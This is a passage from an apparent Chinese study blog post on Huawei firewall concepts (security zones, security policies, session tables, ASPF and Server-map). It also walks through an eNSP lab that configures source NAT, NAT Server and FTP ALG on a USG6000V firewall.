Zone）起源于军方，是介于严格的军事管制区和松散的公共区域之间的一种有着部分管制的区域。防火墙设备引用了这一术语，指代一个逻辑上和物理上都与内部网络和外部网络分离的安全区域</li><li>DMZ安全区域很好地解决了服务器的放置问题。该安全区域可以放置需要对外提供网络服务的设备，如WWW服务器、FTP服务器等。上述服务器如果放置于内部网络，外部恶意用户则有可能利用某些服务的安全漏洞攻击内部网络；如果放置于外部网络，则无法保障它们的安全</li></ul></li><li>受信区域（trust）：通常用于定义内网终端用户所在区域</li><li>本地区域（local）：local区域定义的是设备本身，包括设备的各接口本身。凡是由设备构造并主动发出的报文均可认为是从Local区域中发出，凡是需要设备响应并处理（而不仅是检测或直接转发）的报文均可认为是由local区域接收。用户不能改变local区域本身的任何配置，包括向其中添加接口<br>由于local区域的特殊性，在很多需要设备本身进行报文收发的应用中，需要开放对端所在安全区域与local区域之间的安全策略</li></ul><h4 id="防火墙基本概念：安全策略"><a href="#防火墙基本概念：安全策略" class="headerlink" title="防火墙基本概念：安全策略"></a>防火墙基本概念：安全策略</h4><blockquote><p><font color="RED"><strong>安全策略是控制防火墙对流量转发以及对流量进行内容安全一体化检测的策略</strong></font></p></blockquote><p>当防火墙收到流量后，对流量的属性（五元组、用户、时间段等）进行识别，然后与安全策略的条件进行匹配。如果条件匹配，则此流量被执行对应的动作</p><blockquote><p>五元组 即IP协议五元组 分别是 源端口 目的端口 源IP 目的IP 及协议字段组成，用于标识一个会话</p></blockquote><img src="https://shierjinghuang.github.io/2023/04/16/华为防火墙技术/安全策略.png" style="zoom:50%;" /><h5 id="安全策略执行过程："><a href="#安全策略执行过程：" class="headerlink" title="安全策略执行过程："></a>安全策略执行过程：</h5><ul><li>安全策略的组成有匹配条件、动作和安全配置文件，安全配置文件实现内容安全</li><li>安全策略动作如果为“允许”则可配置安全配置文件，如果为“禁止”则可配置反馈报文</li></ul><img src="https://shierjinghuang.github.io/2023/04/16/华为防火墙技术/安全策略执行过程.png" style="zoom:33%;" /><p><strong>动作说明：</strong></p><ul><li><p>允许：如果动作为允许，则对流量进行如下处理：</p><ul><li>如果没有配置内容安全检测，则允许流量通过</li><li>如果配置内容安全检测，最终根据内容安全检测的结论来判断是否对流量进行放行。内容安全检测包括反病毒、入侵防御等，它是通过在安全策略中引用安全配置文件实现的<ul><li>如果其中一个安全配置文件阻断该流量，则防火墙阻断该流量</li><li>如果所有的安全配置文件都允许该流量转发，则防火墙允许该流量转发</li></ul></li></ul></li><li><p>禁止：表示拒绝符合条件的流量通过</p><ul><li>如果动作为“禁止”，防火墙可以将报文丢弃，还可以针对不同的报文类型选择发送对应的反馈报文。发起连接请求的客户端/服务器收到防火墙发送的阻断报文后，可以快速结束会话并让用户感知到请求被阻断<ul><li>Reset客户端：防火墙向TCP客户端发送TCP reset报文</li><li>Reset服务器：防火墙向TCP服务器发送TCP reset报文</li><li>ICMP不可达：FW向报文客户端发送ICMP不可达报文</li></ul></li></ul></li><li><p>当配置多条安全策略规则时，安全策略的匹配按照策略列表的顺序执行，即从策略列表顶端开始逐条向下匹配。如果流量匹配了某个安全策略，将不再进行下一个策略的匹配</p></li><li><p>安全策略的配置顺序很重要，需要先配置条件精确的策略，再配置宽泛的策略</p></li></ul><h4 id="防火墙基本概念：会话表"><a href="#防火墙基本概念：会话表" class="headerlink" title="防火墙基本概念：会话表"></a>防火墙基本概念：会话表</h4><blockquote><ul><li><font color="skyblue"><strong>会话表是用来记录TCP、UDP、ICMP等协议连接状态的表项，是防火墙转发报文的重要依据</strong></font></li></ul></blockquote><p>防火墙采用了<font color="FF6600"><strong>基于状态的报文控制机制</strong></font>：<font color="FF6600">只对首包或者少量报文进行检测就确定一条连接的状态，大量报文直接根据所属连接的状态进行控制</font></p><p>这种状态检测机制迅速提高了防火墙的检测和转发效率。会话表就是为了记录连接的状态而存在的。设备在转发TCP、UDP和ICMP报文时都需要查询会话表，来判断该报文所属的连接并采取相应的处理措施</p><h5 id="会话表的创建和包处理过程"><a href="#会话表的创建和包处理过程" class="headerlink" title="会话表的创建和包处理过程"></a>会话表的创建和包处理过程</h5><ul><li>防火墙状态检测开启情况下，流量的首包会创建会话表项，后续包即可直接匹配会话表项。</li></ul><img src="https://shierjinghuang.github.io/2023/04/16/华为防火墙技术/会话表的创建和包处理过程.png" style="zoom: 50%;" /><h5 id="会话表的老化时间与长连接"><a href="#会话表的老化时间与长连接" class="headerlink" title="会话表的老化时间与长连接"></a>会话表的老化时间与长连接</h5><ul><li><p>防火墙为各种协议设定了会话老化机制。当一条会话在老化时间内没有被任何报文匹配，则会被从会话表中删除。这种机制可以避免防火墙的设备资源被大量无用、陈旧的会话表项消耗。</p></li><li><p>对于某些特殊业务中，一条会话的两个连续报文可能间隔时间很长 </p><ul><li>用户通过FTP下载大文件，需要间隔很长时间才会在控制通道继续发送控制报文</li><li>用户需要查询数据库服务器上的数据，这些查询操作的时间间隔远大于TCP的会话老化时间</li></ul></li><li><p>如果会话表项被删除，则上述业务会中断，长连接 Long Link机制可以给部分连接设定超长的老化时间，解决解决因会话不爱老化导致的链接中断问题。</p></li></ul><h4 id="多通道协议在防火墙上的问题"><a href="#多通道协议在防火墙上的问题" class="headerlink" title="多通道协议在防火墙上的问题"></a>多通道协议在防火墙上的问题</h4><p>如果在防火墙上配置严格的单向安全策略，那么防火墙将只允许业务单方向发起访问。这会导致一些特殊的协议无法工作</p><blockquote><p><font color="FF6300">通信过程中<strong>需占用两个或两个以上端口的协议被称为多通道协议</strong>，多通道协议需要考虑双向安全策略问题</font></p></blockquote><ul><li><strong>单通道协议</strong>：通信过程中只需占用一个端口的协议</li><li><strong>多通道协议</strong>：通信过程中需占用两个或两个以上端口的协议<ul><li>多通道协议存在时，防火墙配置较为宽泛的安全策略也可以解决协议不可用问题，但是存在安全隐患</li></ul></li></ul><h5 id="ASPF与Server-map"><a href="#ASPF与Server-map" class="headerlink" title="ASPF与Server-map"></a>ASPF与Server-map</h5><p>为了解决多通道协议的问题，防火墙需要识别协议在应用层协商的地址和端口，需要开启ASPF（针对应用层的包过滤）功能</p><blockquote><p><font color="blue">ASPF也称作<strong>基于状态的报文过滤</strong>，ASPF功能可以自动检测某些报文的应用层信息并根据应用层信息放开相应的访问规则，即生成Server-map表</font></p></blockquote><p>Server-map表也记录了类似会话表中连接的状态。Server-map表中的信息相对简单，是简化的会话表，在真实流量到达前生成。在流量真实到达防火墙时，防火墙会基于Server-map表生成会话表，然后执行转发。<br>开启ASPF解决多通道协议问题，是生成Server-map表的一种方式</p><ul><li>Server-map表与会话表的关系如下：<ul><li>Server-map表记录了应用层数据中的关键信息，报文命中该表后，不再受安全策略的控制；</li><li>会话表是通信双方连接状态的具体体现；</li><li>Server-map表不是当前的连接信息，而是防火墙对当前连接分析后得到的即将到来报文的预测；</li><li>防火墙收到报文先检查是否命中会话表；</li><li>如果没有命中则检查是否命中Server-map表；</li><li>命中Server-map表的报文不受安全策略控制；</li><li>防火墙最后为命中Server-map表的数据创建会话表。</li></ul></li></ul><h5 id="Server-map表与简化的包转发过程："><a href="#Server-map表与简化的包转发过程：" class="headerlink" title="Server-map表与简化的包转发过程："></a>Server-map表与简化的包转发过程：</h5><p>当防火墙接收到一个报文且没有命中会话表时，防火墙进入首包处理流程，查询是否有命中的Server-map表。如果有，则会生成会话表转发报文；如果没有，则执行其他包处理过程</p><img src="https://shierjinghuang.github.io/2023/04/16/华为防火墙技术/防火墙Server-map下的包转发流程.png" alt="防火墙Server-map下的包转发流程" style="zoom:50%;" /><h3 id="防火墙的基础配置"><a href="#防火墙的基础配置" class="headerlink" title="防火墙的基础配置"></a>防火墙的基础配置</h3><h4 id="防火墙基础配置命令"><a href="#防火墙基础配置命令" class="headerlink" title="防火墙基础配置命令"></a>防火墙基础配置命令</h4><h5 id="防火墙基础配置-接口"><a href="#防火墙基础配置-接口" class="headerlink" title="防火墙基础配置 - 接口"></a>防火墙基础配置 - 接口</h5><p>1 创建接口/进入接口视图</p><pre class="line-numbers language-none"><code class="language-none">[R1] interface interface-type interface-number<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>和交换机、路由器相同，interface命令用来创建接口或进入指定的接口视图</p><p>2 配置接口允许通过的协议</p><pre class="line-numbers language-none"><code class="language-none">[R1-G0&#x2F;0&#x2F;1] service-manage &#123;http|https|ping|ssh|snmp|netconf|telnet|all &#125; &#123;permit|deny&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>service-manage命令用来允许或拒绝管理员通过HTTPS、Ping、SSH、SNMP、NETCONF以及Telnet访问设备<br>缺省情况下，接口开启了访问控制管理功能。仅有管理接口下 HTTP、HTTPS、Ping权限放开。非管理口所有权限都关闭。此时，即使配置了接口所在安全域允许访问local区域的安全策略，也不能通过该接口访问本地防火墙</p><h5 id="防火墙基础配置-安全区域"><a href="#防火墙基础配置-安全区域" class="headerlink" title="防火墙基础配置 - 安全区域"></a>防火墙基础配置 - 安全区域</h5><p>1 创建安全区域</p><pre class="line-numbers language-none"><code class="language-none">[R1] firewall zone name zone-name [ id id ]  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>firewall zone name命令创建安全区域，并进入安全区域视图。id表示安全区域ID，取值4～99，默认递增</p></li><li><p>firewall zone命令用来并进入安全区域视图。防火墙默认的四个区域无需创建也不能删除</p></li></ul><p>2 设置安全区域优先级</p><pre class="line-numbers language-none"><code class="language-none">[R1-zone-name] set priority security-priority<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>优先级取值范围为1～100，全局唯一，值越大优先级越高。系统默认的安全区域不能被删除，优先级也无法被重新配置或者删除</p><p>3 添加接口到安全区域</p><pre class="line-numbers language-none"><code class="language-none">[R1-zone-name] add interface interface-type &#123;interface-number|interface-number.subinterface-number&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安全区域在使用时需要与防火墙的特定接口相关联，即需要将接口加入到安全区域。该接口既可以是物理接口，也可以是逻辑接口</p><h5 id="防火墙基础配置-安全策略"><a href="#防火墙基础配置-安全策略" class="headerlink" title="防火墙基础配置 - 安全策略"></a>防火墙基础配置 - 安全策略</h5><p>1 进入安全策略视图</p><pre class="line-numbers language-none"><code class="language-none">[R1] security-policy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>安全策略规则的创建、复制、移动和重命名都在此视图下完成。</li></ul><p>2 创建规则</p><pre class="line-numbers language-none"><code class="language-none">[R1-policy-security] rule name rule-name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>rule name命令用来创建安全策略规则，并进入安全策略规则视图。</li></ul><p>3 配置安全策略规则的源安全区域</p><pre class="line-numbers language-none"><code class="language-none">[R1-policy-security-rule-name] source-zone &#123; zone-name &amp;&lt;1-6&gt; | any &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>命令中zone-name必须为系统已经存在的安全区域名称。安全策略规则一次最多添加或删除6个安全区域</li></ul><p>4 配置安全策略规则的目的安全区域</p><pre class="line-numbers language-none"><code class="language-none">[R1-policy-security-rule-name] destination-zone &#123; zone-name &amp;&lt;1-6&gt; | any &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5 配置安全策略规则的源IP地址</p><pre class="line-numbers language-none"><code class="language-none">[R1-policy-security-rule-name] source-address ipv4-address &#123;ipv4-mask-length|mask mask-address&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>命令中mask-address使用反掩码</li></ul><p>6  配置安全策略规则的目的IP地址</p><pre class="line-numbers language-none"><code class="language-none">[R1-policy-security-rule-name] destination-address ipv4-address &#123;ipv4-mask-length|mask mask-address&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>命令中mask-address使用反掩码</li></ul><p>7 配置服务</p><pre class="line-numbers language-none"><code class="language-none">[Huawei] service &#123; service-name &amp;&lt;1-6&gt; | any &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>service命令用来配置服务，如service protocol用来在安全策略中直接引用TCP/UDP/SCTP端口或IP层协议</li></ul><p>8 配置安全策略规则的动作</p><pre class="line-numbers language-none"><code class="language-none">[Huawei] action &#123; permit | deny &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>防火墙默认的动作为deny</li></ul><h3 id="防火墙安全策略配置实验"><a href="#防火墙安全策略配置实验" class="headerlink" title="防火墙安全策略配置实验"></a>防火墙安全策略配置实验</h3><img src="https://shierjinghuang.github.io/2023/04/16/华为防火墙技术/防火墙安全策略配置实验拓扑.jpg" style="zoom:67%;" /><center>防火墙安全策略拓扑</center>设备互联方式、IP地址规划如图所示，R1、R2通过交换机S1与防火墙进行三层通信，S1上将连接R1、R2的接口分别划分到VLAN10、20，将连接防火墙的接口GE0/0/14、GE0/0/15分别划分到VLAN10、20。<p>R1属于DMZ（Demilitarized Zone，非军事化）区域、R2属于Untrust区域，在FW1上配置源NAT使得R1以FW1的GE0/0/2接口地址访问Untrust区域，同时配置NAT Server，使得R2可以通过FW1的GE0/0/2接口地址访问R1上开启的FTP服务。</p><p>在FW1上配置安全策略，限制R1、R2之间的访问：DMZ区域的R1对Untrust区域的访问不受任何限制，但是Untrust区域只能主动访问DMZ区域中R1上的FTP服务。</p><h4 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h4><p>为了保护企业网络安全，需要在企业网络边界部署一台防火墙，限制外部网络对企业内部网络的主动访问，同时作为出口设备，需要在防火墙上部署源NAT[用于内部用户访问Internet]、NAT Server[将内网服务器映射到公网]</p><p>企业内部对外提供访问的服务为FTP服务，FTP协议为多通道协议，对于多通道协议，除了部署安全策略之外，还需要借助NAT ALG才能实现经过防火墙NAT之后依旧能够正常通信。</p><h4 id="任务步骤"><a href="#任务步骤" class="headerlink" title="任务步骤"></a>任务步骤</h4><h5 id="步骤-1-基础连通性配置"><a href="#步骤-1-基础连通性配置" class="headerlink" title="步骤 1 基础连通性配置"></a>步骤 1 基础连通性配置</h5><ul><li>完成互联接口IP地址配置、交换机VLAN划分配置，在R1、FW1上配置默认路由。</li></ul><p><strong>交换机基础配置</strong></p><pre class="line-numbers language-none"><code class="language-none">[S1]vlan 10[S1-vlan10] description DMZ[S1-vlan10] quit[S1]interface GigabitEthernet0&#x2F;0&#x2F;1[S1-GigabitEthernet0&#x2F;0&#x2F;1] port link-type access[S1-GigabitEthernet0&#x2F;0&#x2F;1] port default vlan 10[S1-GigabitEthernet0&#x2F;0&#x2F;1] quit[S1]interface GigabitEthernet0&#x2F;0&#x2F;14[S1-GigabitEthernet0&#x2F;0&#x2F;14] port link-type access[S1-GigabitEthernet0&#x2F;0&#x2F;14] port default vlan 10[S1-GigabitEthernet0&#x2F;0&#x2F;14] quit[S1]vlan 20[S1-vlan20] description Untrust[S1-vlan20] quit[S1]interface GigabitEthernet0&#x2F;0&#x2F;2[S1-GigabitEthernet0&#x2F;0&#x2F;2] port link-type access[S1-GigabitEthernet0&#x2F;0&#x2F;2] port default vlan 20[S1-GigabitEthernet0&#x2F;0&#x2F;2] quit[S1]interface GigabitEthernet0&#x2F;0&#x2F;15[S1-GigabitEthernet0&#x2F;0&#x2F;15] port link-type access[S1-GigabitEthernet0&#x2F;0&#x2F;15] port default vlan 20[S1-GigabitEthernet0&#x2F;0&#x2F;15] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>R1 配置</strong></p><pre class="line-numbers language-none"><code class="language-none">[R1]interface GigabitEthernet0&#x2F;0&#x2F;3[R1-GigabitEthernet0&#x2F;0&#x2F;3] ip address 10.0.11.11 24[R1-GigabitEthernet0&#x2F;0&#x2F;3] quit[R1]ip route-static 0.0.0.0 0.0.0.0 10.0.11.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>配置用于访问Internet的默认路由。</li></ul><p><strong>R2 配置</strong></p><pre class="line-numbers language-none"><code class="language-none">[R2]interface GigabitEthernet0&#x2F;0&#x2F;4[R2-GigabitEthernet0&#x2F;0&#x2F;3] ip address 10.0.12.2 255.255.255.0[R2-GigabitEthernet0&#x2F;0&#x2F;3] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>FW1登录配置</strong></p><pre class="line-numbers language-none"><code class="language-none">Login authenticationUsername:adminPassword:The password needs to be changed. Change now? [Y&#x2F;N]: YPlease enter old password: Please enter new password: Please confirm new password:防火墙的Console接口默认存在认证配置，默认账号密码为：admin&#x2F;Admin@123登录之后需要修改密码才可以正常登录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>配置FW1接口IP、默认路由</strong></p><pre class="line-numbers language-none"><code class="language-none">[FW1]interface GigabitEthernet0&#x2F;0&#x2F;1[FW1-GigabitEthernet0&#x2F;0&#x2F;1] ip address 10.0.11.1 255.255.255.0[FW1-GigabitEthernet0&#x2F;0&#x2F;1] quit[FW1]interface GigabitEthernet0&#x2F;0&#x2F;2[FW1-GigabitEthernet0&#x2F;0&#x2F;2] ip address 10.0.12.1 255.255.255.0[FW1-GigabitEthernet0&#x2F;0&#x2F;2] quit[FW1]ip route-static 0.0.0.0 0.0.0.0 10.0.12.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>配置FW1接口允许通过ping报文</strong></p><pre class="line-numbers language-none"><code class="language-none">[FW1]interface GigabitEthernet0&#x2F;0&#x2F;1[FW1-GigabitEthernet0&#x2F;0&#x2F;1] service-manage ping permit[FW1-GigabitEthernet0&#x2F;0&#x2F;1] quit[FW1]interface GigabitEthernet0&#x2F;0&#x2F;2[FW1-GigabitEthernet0&#x2F;0&#x2F;2] service-manage ping permit[FW1-GigabitEthernet0&#x2F;0&#x2F;2] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>防火墙的接口缺省开启service-manage，service-manage在接口层面进行安全把控，它决定用户是否能通过该接口管理/访问防火墙（例如通过ping、ssh、telnet、snmp等方式）。GE0/0/0接口是设备的网管接口，该接口缺省便配置了service-manage ping permit、service-manage ssh permit等命令，因此用户能够通过该接口管理防火墙。但是对于其他接口，缺省时防火墙禁止用户从该接口管理/访问自己，除非显式地配置service-manage命令。例如，如果希望允许用户Ping GE1/0/1接口，则需在GE1/0/1接口上配置service-manage ping permit命令，同理如果希望允许用户SSH GE1/0/1接口，则需配置service-manage ssh permit</p><h5 id="步骤-2-配置Local域到其他区域的安全策略规则"><a href="#步骤-2-配置Local域到其他区域的安全策略规则" class="headerlink" title="步骤 2 配置Local域到其他区域的安全策略规则"></a>步骤 2 配置Local域到其他区域的安全策略规则</h5><p>将接口加入到安全域，同时创建一个安全策略规则local_to：</p><ol><li><p>源、目IP不做任何限制</p></li><li><p>目的安全域不限制</p></li><li><p>服务不做任何限制</p></li><li><p>源安全域为Local</p></li><li><p>动作为允许</p></li></ol><p><strong>将接口加入到安全域中</strong></p><pre class="line-numbers language-none"><code class="language-none">[FW1]firewall zone dmz[FW1-zone-dmz] description DMZ[FW1-zone-dmz] add interface GigabitEthernet0&#x2F;0&#x2F;1[FW1-zone-dmz] quit[FW1]firewall zone untrust[FW1-zone-untrust] description Untrust[FW1-zone-untrust] add interface GigabitEthernet0&#x2F;0&#x2F;2[FW1-zone-untrust] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>创建安全策略规则local_to</strong></p><pre class="line-numbers language-none"><code class="language-none">[FW1]security-policy[FW1-policy-security] rule name local_to[FW1-policy-security-rule-local_to] source-zone local[FW1-policy-security-rule-local_to] action perit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>未配置源、目IP，目的安全域，服务，默认情况下这些参数为any。</li></ul><p><strong>测试FW1与R1、R2接口IP地址的连通性</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;FW1&gt;ping -c 1 10.0.11.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="步骤-3-配置源NAT、NAT-Server"><a href="#步骤-3-配置源NAT、NAT-Server" class="headerlink" title="步骤 3 配置源NAT、NAT Server"></a>步骤 3 配置源NAT、NAT Server</h5><ul><li>配置NAPT用于私网用户（R1）访问Internet，配置NAT Server将R1的FTP服务映射到公网。</li></ul><p><strong>配置NAT地址池，配置时开启允许端口地址转换，实现公网地址复用</strong></p><pre class="line-numbers language-none"><code class="language-none">[FW1]nat address-group 1[FW1-address-group-1] mode pat [FW1-address-group-1] section 0 10.0.12.1 10.0.12.1[FW1-address-group-1] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>配置源NAT策略，实现私网指定网段访问Internet时自动进行源地址转换</strong></p><pre class="line-numbers language-none"><code class="language-none">[FW1]nat-policy [FW1-policy-nat] rule name 1[FW1-policy-nat-rule-1] source-zone dmz[FW1-policy-nat-rule-1] destination-zone untrust[FW1-policy-nat-rule-1] source-address 10.0.11.0 24[FW1-policy-nat-rule-1] action source-nat address-group 1[FW1-policy-nat-rule-1] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>配置NAT Server功能，创建静态映射，映射R1的FTP服务</strong></p><pre class="line-numbers language-none"><code class="language-none">[FW1]nat server policy_ftp protocol tcp global 10.0.12.1 ftp inside 10.0.11.11 ftp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>开启FTP协议的NAT ALG功能</strong></p><pre class="line-numbers language-none"><code class="language-none">[FW1]firewall zone dmz [FW1-zone-dmz] detect ftp [FW1-zone-dmz] quit[FW1]firewall interzone dmz untrust [FW1-interzone-dmz-untrust] detect ftp [FW1-interzone-dmz-untrust] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="步骤-4-配置DMZ、Untrust区域之间的安全策略规则"><a href="#步骤-4-配置DMZ、Untrust区域之间的安全策略规则" class="headerlink" title="步骤 4 配置DMZ、Untrust区域之间的安全策略规则"></a>步骤 4 配置DMZ、Untrust区域之间的安全策略规则</h5><p>配置安全策略DMZtoUntrust，源地址限制为10.0.11.0/24，动作为允许；配置安全策略Untrust_DMZ，只允许R2访问R1提供的FTP服务。</p><blockquote><ul><li>防火墙安全策略实验 需要使用USG6000V防火墙 USG5500没有security-policy及之后的一些指令 </li><li>同时ENSP软件，并不自带USG6000V防火墙的.vdi文件需要自行下载安装</li><li> 防火墙的Console接口默认存在认证配置，默认账号密码为：admin/Admin@123，登录之后需要修改密码才可以正常登录</li></ul></blockquote><p><strong>创建安全策略规则DMZtoUntrust</strong></p><pre class="line-numbers language-none"><code class="language-none">[FW1]security-policy[FW1-policy-security] rule name DMZtoUntrust[FW1-policy-security-rule-DMZtoUntrust] source-zone dmz[FW1-policy-security-rule-DMZtoUntrust] destination-zone untrust[FW1-policy-security-rule-DMZtoUntrust] source-address 10.0.11.0 24[FW1-policy-security-rule-DMZtoUntrust] action permit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>创建安全策略规则Untrust_DMZ</strong></p><pre class="line-numbers language-none"><code class="language-none">[FW1]security-policy[FW1-policy-security-rule] rule name Untrust_DMZ[FW1-policy-security-rule-Untrust_DMZ] source-zone untrust[FW1-policy-security-rule-Untrust_DMZ] destination-zone dmz[FW1-policy-security-rule-Untrust_DMZ] destination-address 10.0.11.11 24[FW1-policy-security-rule-Untrust_DMZ] service ftp[FW1-policy-security-rule-Untrust_DMZ] action permit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意目的IP地址为映射的内部地址，安全策略对报文的处理在NAT Server修改报文的目的IP地址之后。</p><h5 id="步骤-5-查看FW1会话"><a href="#步骤-5-查看FW1会话" class="headerlink" title="步骤 5 查看FW1会话"></a>步骤 5 查看FW1会话</h5><p>在R1上ping     R2，查看FW1会话的详细信息。</p><p><strong>测试R1访问R2</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;R1&gt;ping -c 100 10.0.12.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>R1能够经过FW1正常访问R2，此时在FW1上查看相关会话的详细信息。</p><p><strong>查看FW1会话</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;FW1&gt;display firewall session table verbose destination global 10.0.12.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看目的global IP为10.0.12.2的会话详细信息，在输出信息中可以看到该会话的安全域方向：从dmz到untrust，该会话的老化时间（TTL）为20s，接收到报文的接口为GigabitEthernet0/0/1，发送报文的接口为GigabitEthernet0/0/2，一共存在100个匹配中该会话的报文，一共8400Byte。可以看到该会话匹配的安全策略规则名称为：DMZtoUntrust。</p><p>同时从会话中我们可以看到该报文进行了源地址转换，源IP10.0.11.11转换为了10.0.12.1 FW1的GE0/0/2接口地址</p><h5 id="步骤-6-观察NAT-ALG工作过程"><a href="#步骤-6-观察NAT-ALG工作过程" class="headerlink" title="步骤 6 观察NAT ALG工作过程"></a>步骤 6 观察NAT ALG工作过程</h5><p>在R1上开启FTP服务，R2作为FTP客户端通过FW1映射出的地址登录R1的FTP服务，并执行命令<strong>dir</strong>查看文件列表，观察FW1的ASPF如何处理多通道协议。</p><p> <strong>R1上开启FTP服务</strong></p><pre class="line-numbers language-none"><code class="language-none">[R1]aaa[R1-aaa] local-user ftp service-type ftp[R1-aaa] local-user ftp password cipher ftp@123[R1-aaa] local-user ftp privilege level 15[R1-aaa] local-user ftp ftp-directory flash:[R1-aaa] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>R2访问R1开启的FTP服务，注意是通过FW1上映射的地址进行访问</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;R2&gt;ftp 10.0.12.1 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若实验成功实现，则R2可以成功通过FW1的NAT Server映射访问R1开启的FTP服务</p><p><strong>查看FW1的会话表</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;FW1&gt;display firewall session table verbose protocol tcp destination-port global<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>当实验完成，执行上述命令可以看到FTP的控制通道已经建立 </li></ul><p><strong>在R2上执行命令dir</strong></p><pre class="line-numbers language-none"><code class="language-none">[ftp]dir<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>能够看到R1的文件列表，此时已经使用了FTP的传输通道。</li></ul><p><strong>再次查看FW1的会话表</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;FW1&gt;display firewall session table <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>依旧只存在FTP控制通道会话，并无传输通道会话。</li></ul><p><strong>查看NAT ALG生成的Server-map表项</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;FW1&gt;display firewall server-map <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>FW1上已经生成了FTP数据通道的Server-map表项</li><li>注意在查看之前需要在R2上执行<strong>dir</strong>触发传输通道的流量。 </li></ul><h4 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h4><p>在防火墙上放通local安全域到其他区域的目的是什么？</p><blockquote><p><del><strong>在防火墙上放通local安全域到其他区域，主要的目的是为了允许该安全域内的计算机或设备与其他区域的计算机或设备进行通信和交互</strong></del>  某ChatGPT给出的答案不一定准确</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;华为防火墙技术概述&quot;&gt;&lt;a href=&quot;#华为防火墙技术概述&quot; class=&quot;headerlink&quot; title=&quot;华为防火墙技术概述&quot;&gt;&lt;/a&gt;华为防火墙技术概述&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;防火墙概述&quot;&gt;&lt;a href=&quot;#防火墙概述&quot; </summary>
      
    
    
    
    <category term="网络安全" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/tags/HCIP/"/>
    
    <category term="防火墙技术" scheme="https://shierjinghuang.github.io/tags/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>网络安全法</title>
    <link href="https://shierjinghuang.github.io/2023/04/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/"/>
    <id>https://shierjinghuang.github.io/2023/04/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/</id>
    <published>2023-04-12T08:32:31.000Z</published>
    <updated>2023-04-25T07:36:09.205Z</updated>
    
